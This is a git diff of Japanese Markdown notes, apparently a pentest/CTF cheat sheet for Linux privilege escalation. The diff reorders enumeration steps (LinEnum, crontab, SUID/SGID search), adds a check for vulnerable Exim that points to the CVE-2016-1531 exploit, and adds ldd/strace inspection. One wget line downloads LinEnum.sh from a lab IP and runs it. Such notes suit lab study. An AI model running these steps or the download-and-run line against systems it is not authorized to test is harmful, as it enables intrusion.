@@ -95,27 +95,31 @@ openssl passwd [NEW PASSWORD]
 ```
 
 ### 怪しいスクリプトの調査
-1. LinEnumを実行
-2. CronTabに設定されているスクリプトの確認（コマンド名 or 絶対パス）
-3. SUID / SGIDファイルの確認
-4. その他ファイルの確認（一般ユーザーのホームディレクトリなど。LinEnumのInteresting Filesセクションも参考）
-
-・LinEnumのダウンロード、実行
+1. LinEnumのダウンロード、実行
 ```
 wget http://10.4.49.251/LinEnum.sh -O /tmp/LinEnum.sh; chmod +x /tmp/LinEnum.sh; sh /tmp/LinEnum.sh
 ```
 
-・CronTabの確認
+2. CronTabの確認（コマンド名 or 絶対パス）
 ```
 cat /etc/crontab
 ```
 
-・全てのSUID / SGIDファイルの探索
+3. SUID / SGIDファイルの確認
 ```
 find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 ```
 
-### スクリプト内の実行コマンドの調査
+4. その他ファイルの確認（一般ユーザーのホームディレクトリなど。LinEnumのInteresting Filesセクションも参考）
+
+5. 既存の脆弱性のあるプログラムの確認  
+Exim <= 4.84-3（SUID / SGIDがセットされている必要あり。もし存在すれば [CVE-2016-1531](https://www.exploit-db.com/exploits/39535) を使う。）
+```
+find / -type f -name exim 2>/dev/null
+```
+
+
+### 実行されているプログラムの調査
 ・シェルスクリプトの場合
 ```
 cat [FILE]
@@ -127,9 +131,13 @@ cat [FILE]
 strings [FILE]
 ```
 
-2. システムコール単位での処理の流れから、実行エラーになっているライブラリやファイルなどを確認。
+2. 実行されているプログラムと依存関係にある共有ライブラリを確認。
 ```
-strace [FILE]
+ldd [FILE]
+```
+
+3. システムコール単位での処理の流れから、実行エラーになっているライブラリやファイルなどを確認。
+```
 strace [FILE] 2>&1 | grep -iE "open|access|no such file"
 ```
 
